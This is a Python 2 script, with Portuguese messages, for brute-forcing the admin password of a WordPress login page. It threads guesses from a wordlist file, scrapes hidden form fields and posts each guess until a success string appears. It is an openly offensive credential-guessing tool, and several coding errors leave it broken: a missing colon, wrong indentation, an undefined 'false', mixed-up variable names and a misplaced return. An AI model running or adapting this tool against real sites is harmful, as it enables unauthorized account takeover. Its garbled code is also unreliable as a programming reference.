#!/usr/bin/env python

import urllib
import urllib2
import cookielib
import threading
import sys
import Queue

from HTMLParser import HTMLParser

user_thread = 10
username = "admin"
wordlist_file = "passwords.txt"
resume = None

target_url = "http://minhaurl/wordpress/wp-admin"
target_post = "http://minhaurl/wordpress/wp-admin"

username_field = "username"
password_field = "passwd"

success_check = "Administration - Control Panel"

class BruteParser(HTMLParser):
	def __init__(self):
		HTMLParser.__init__(self)
		self.tag_results = {}
		
	def handle_starttag(self, tag, attrs):
		if tag == "input":
			tag_name = None
			tag_value = None
			for name, value in attrs:
				if name == "name":
					tag_name = value
				if name == "value":
					tag_name = value
					
			if tag_name is not None:
				self.tag_results[tag_name] = value

class Bruter(object):
	def __init__(self, username, words):
		self.username = username
		self.password_q = words
		self.found = False
		
		print "Configuração concluída para: %s" % username
	
	def run_bruteforce(self)
		for i in range(user_thread):
		t = threading.Thread(target=self.web_bruter)
		t.start()
		
	def web_bruter(self):
		while not self.password_q.empty() and not self.found:
			brute = self.password_q.get().rstrip()
			jar = cookielib.FileCookieJar("cookies")
			opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(jar))
			response = opener.open(target_url)
			page = response.read()
			print "Tentando: %s : %s (%d left)" %

(self.username,brute,self.password_q.qsize())
			
			parser = BruteParser()
			parser.feed(page)
			post_tags = parser.tag_results
			post_tags[username_field] = self.username
			post_tags[password_field] = brute
			login_data = urllib.urlencode(post_tags)
			login_response = opener.open(target_post, login_data)
			login_result = login_response.read()
			
			if success_check in login_result:
				self.found = True
				print "[*] Bruteforce realizado com sucesso"
				print "[*] Username: %s" % username
				print "[*] Password: %s" % brute
				
def build_wordlist(wordlist_file):
	fd = open(wordlist_file, "rb")
	raw_words = fd.readlines()
	fd.close()
	
	found_resume = false
	word = Queue.Queue()
	
	for word in raw_words:
		word = word.rstrip()
		if resume is not None:
			if found_resume:
				words.put(word)
			else:
				if word == resume:
					found_resume = True
					print "Retomando a lista de palavras de: %s" % resume
			else:
				words.put(word)
		return words
		
words = build_wordlist(wordlist_file)

		
	